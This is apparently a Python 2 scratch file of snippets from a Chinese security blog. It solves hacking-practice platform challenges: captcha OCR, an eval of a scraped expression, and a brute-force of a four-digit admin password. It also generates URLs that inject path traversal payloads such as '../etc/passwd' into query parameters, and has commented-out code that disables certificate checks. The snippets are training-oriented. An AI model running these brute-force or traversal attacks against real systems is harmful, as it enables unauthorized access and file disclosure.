# -*- coding: utf_8 -*-
#http://www.waitalone.cn/python-php-ocr.html
import urllib2
from lxml import etree
from lxml.html.clean import Cleaner
import ssl,re
from selenium import webdriver
import urlparse, copy, urllib
try:
    import pytesseract
    from PIL import Image
except ImportError:
    print '模块导入错误,请使用pip安装,pytesseract依赖以下库：'
    print 'http://www.lfd.uci.edu/~gohlke/pythonlibs/#pil'
    print 'http://code.google.com/p/tesseract-ocr/'
    raise SystemExit

image = Image.open('default.png')
image.load()
#image = Image.open('test.png').load() 这样不行
vcode = pytesseract.image_to_string(image)
print vcode
exit()
driver = webdriver.PhantomJS(executable_path='phantomjs')  #这要可能需要制定phatomjs可执行文件的位置
driver.get("http://www.ip.cn/125.95.26.81")
#print driver.current_url
#print driver.page_source
print driver.find_element_by_id('result').text.split('\n')[0].split('来自：')[1]
driver.quit
try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

print u'\n网络信息安全攻防学习平台脚本关第2题\n'
s = requests.Session()
url = 'http://1.hacklist.sinaapp.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'
r = s.get(url)
res = unicode(r.content, 'utf-8').encode('gbk')
# print res

num = re.findall(re.compile(r'<br/>\s+(.*?)='), res)[0]
print '当前获取到需要口算的表达式及计算结果为:\n\n%s=%d\n' % (num, eval(num))

r = s.post(url, data={'v': eval(num)})
print re.findall(re.compile(r'<body>(.*?)</body>'), r.content)[0]
# http://www.waitalone.cn/security-scripts-game.html
try:
    print '\n网络信息安全攻防学习平台脚本关第4题\n'
    s = requests.Session()
    url = 'http://1.hacklist.sinaapp.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
    for pwd in xrange(1000, 10000):
        payload = {'username': 'admin', 'pwd': pwd, 'vcode': 'gkcj'}
        header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=2477842dec43ca1394e3c47867223295'}
        r = s.post(url, data=payload, headers=header)
        if 'error' not in r.content:
            print '\n爷,正确密码为:', pwd
            print '\n' + r.content
            break
        else:
            print '正在尝试密码:', pwd
except KeyboardInterrupt:
    raise SystemExit('大爷,按您的吩咐,已成功退出！')



def getText(url):
    '''
    获取指定url返回页的所有文字
    :param url: 需要抓取的url
    :return: 返回文字http://www.waitalone.cn/lxml-text.html
    '''
    page = urllib2.urlopen(url, timeout=10).read()
    page = unicode(page, "utf-8")  # 转换编码,否则会导致输出乱码
    cleaner = Cleaner(style=True, scripts=True, page_structure=False, safe_attrs_only=False)  # 清除掉CSS等
    str = etree.HTML(cleaner.clean_html(page))
    texts = str.xpath('//*/text()')  # 获取所有文本
    for t in texts:
        print t.strip().encode('gbk', 'ignore')


getText('http://www.baidu.com/')

# 内容中不得出现 '招聘', '诚聘', '社招' 等关键字，符合条件的才打印出来
filters = [u'招聘', u'诚聘', u'社招']
contents = [
    u'独自等待安全团队诚聘, http://www.waitalone.cn/',
    u'独自等待安全团队招聘, http://www.waitalone.cn/',
    u'独自等待安全团队社招, http://www.waitalone.cn/',
    u'独自等待信息安全博客, http://www.waitalone.cn/',
]

for content in contents:
    if any(i in content for i in filters): continue
    print content

payloads = ('../boot.ini','../etc/passwd','../windows/win.ini','../../boot.ini','../../etc/passwd')
 
s1 = ['123']*5
s2 = ['456']*5
s3 = ['ooo']*5
 
a = zip(payloads, s2, s3) + zip(s1, payloads, s3) + zip(s1, s2, payloads)
 
for item in a:
  x, y, z = item
  print ("http://www.waitalone.cn/index.php?id=%s&abc=%s&xxx=%s" %(x,y,z))


# http://www.waitalone.cn/replace-url-params.html  http://ideone.com/Jbfmst
def url_values_plus(url, vals):
    ret = []
    u = urlparse.urlparse(url)
    qs = u.query
    pure_url = url.replace('?'+qs, '')
    qs_dict = dict(urlparse.parse_qsl(qs))
    for val in vals:
        for k in qs_dict.keys():
            tmp_dict = copy.deepcopy(qs_dict)
            tmp_dict[k] = val
            tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict))
            ret.append(pure_url + "?" + tmp_qs)
    return ret

url = "http://www.waitalone.cn/index.php?id=123&abc=456&xxx=ooo"
payloads = ('../boot.ini','../etc/passwd','../windows/win.ini','../../boot.ini','../../etc/passwd')
#urls = url_values_plus(url, payloads)
#for pure_url in urls:
    #print pure_url


# SSL: CERTIFICATE_VERIFY_FAILED
#context = ssl._create_unverified_context()
#print urllib2.urlopen("https://www.baidu.com/", context=context).read()

#ssl._create_default_https_context = ssl._create_unverified_context
#print urllib2.urlopen("https://www.baidu.com/").read()
